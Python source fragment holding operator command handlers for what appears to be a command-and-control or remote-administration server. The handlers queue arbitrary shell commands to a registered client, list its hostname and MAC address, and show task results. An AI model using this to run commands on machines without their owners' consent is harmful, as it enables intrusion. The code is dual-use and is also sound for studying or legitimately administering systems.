def cmd_send(server, args):
    if not args:
        print("usage: send <msg>")
        return
    
    server.send_task("print_message", {
        "message": " ".join(args)
    })

def cmd_shell(server, args):
    if not args:
        print("usage: shell <cmd>")
        return
    
    server.send_task("shell", {
        "cmd": " ".join(args)
    })

def cmd_list(server, args):
    if not server.client:
        print("no client")
        return
    
    c = server.client
    print(f"{c['hostname']} | {c['mac']}")

def cmd_queue(server, args):
    if not server.client:
        print("no client")
        return

    print(list(server.client["tasks"]))

def cmd_sysinfo(server, args):
    server.send_task("shell", {
        "cmd": "uname -a"
    })

def cmd_results(server, args):
    if not server.client:
        print("no client")
        return

    for tid, r in server.client["results"].items():
        print(f"{tid} [{r['status']}] -> {r['output']}")

COMMANDS = {
    "shell": cmd_shell,
    "list": cmd_list,
    "send": cmd_send,
    "queue": cmd_queue,
    "sysinfo": cmd_sysinfo,
    "results": cmd_results
}
